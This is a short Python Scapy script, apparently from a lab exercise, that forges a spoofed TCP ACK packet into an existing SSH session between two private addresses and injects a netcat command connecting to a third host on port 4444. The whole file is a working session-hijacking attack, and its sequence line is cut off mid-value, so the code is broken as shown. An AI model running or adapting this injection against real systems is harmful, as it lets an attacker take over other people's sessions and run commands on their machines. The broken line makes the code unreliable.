import sys
from scapy.all import *

print("sending session hijacking packet...")
IPLayer = IP (src="10.10.10.198", dst = "10.10.10.184")
TCPLayer = TCP (sport=54236, dport=22, flags="A", seq=2742050155, ack=240278573>
Data ="\r nc 10.10.10.199 4444 \r"
pkt=IPLayer/TCPLayer/Data
ls(pkt)
send(pkt,verbose=0)

